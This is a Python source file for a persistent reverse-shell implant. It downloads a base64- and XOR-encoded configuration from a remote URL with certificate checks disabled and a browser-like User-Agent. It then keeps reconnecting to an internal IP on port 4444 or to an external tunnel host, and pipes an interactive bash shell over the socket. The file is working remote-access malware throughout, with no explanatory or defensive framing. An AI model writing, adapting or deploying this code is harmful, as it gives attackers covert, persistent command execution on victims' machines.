import socket
import os
import time
import threading
import sys
import signal
import select
import subprocess
import json
import base64
from urllib.request import Request, urlopen
import ssl

# --- Config defaults ---
INT_IP = ""
INT_PORT = 4444
NG_HOST = ""
NG_PORT = 0

GITHUB_CONFIG_URL = ""
PASSWORD = ""


def dec(x):
    if not x or x == "None":
        return None
    try:
        enc_bytes = base64.b64decode(x)
        dec_chars = [
            chr(b ^ ord(PASSWORD[i % len(PASSWORD)])) for i, b in enumerate(enc_bytes)
        ]
        result = "".join(dec_chars).strip()
        return result if result else None
    except:
        return None


def fetch_config():
    global INT_IP, NG_HOST, NG_PORT
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = Request(GITHUB_CONFIG_URL, headers={"User-Agent": "Mozilla/5.0"})

        with urlopen(req, timeout=5, context=ctx) as resp:
            content = resp.read().decode()
            config = json.loads(content)

            INT_IP = dec(config.get("INT_IP")) or INT_IP
            NG_HOST = dec(config.get("NG_HOST")) or NG_HOST
            NG_PORT = dec(config.get("NG_PORT")) or NG_PORT

            try:
                if NG_PORT:
                    NG_PORT = int(NG_PORT)
            except:
                pass

            pass
    except Exception:
        pass


connection_active = False
lock = threading.Lock()


def is_connection_dead(s, pid=None):
    try:
        if pid:
            os.kill(pid, 0)
        readable, _, _ = select.select([s], [], [], 0.1)
        if readable:
            data = s.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)
            if len(data) == 0:
                return True
    except:
        return True
    return False


def start_shell(host, port, is_internal=False):
    global connection_active
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, int(port)))
        s.settimeout(None)

        s.sendall(b"\n")
        time.sleep(0.5)

        with lock:
            connection_active = True

        p = subprocess.Popen(
            ["/bin/bash", "-i"],
            stdin=s.fileno(),
            stdout=s.fileno(),
            stderr=s.fileno(),
            preexec_fn=os.setsid,
        )

        while p.poll() is None:
            if is_connection_dead(s, p.pid):
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
                break
            time.sleep(10)

    except Exception:
        pass
    finally:
        try:
            s.close()  # type: ignore
        except:
            pass
        with lock:
            connection_active = False


def main():
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)

    fetch_config()

    while True:
        with lock:
            is_connected = connection_active

        if not is_connected:
            targets = []
            if INT_IP and str(INT_IP) != "None":
                targets.append((INT_IP, INT_PORT, True))
            if NG_HOST and str(NG_HOST) != "None" and NG_PORT:
                targets.append((NG_HOST, NG_PORT, False))
            for host, port, internal_flag in targets:
                with lock:
                    if connection_active:
                        break

                t = threading.Thread(
                    target=start_shell, args=(host, port, internal_flag), daemon=True
                )
                t.start()
                time.sleep(5)

        time.sleep(10)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
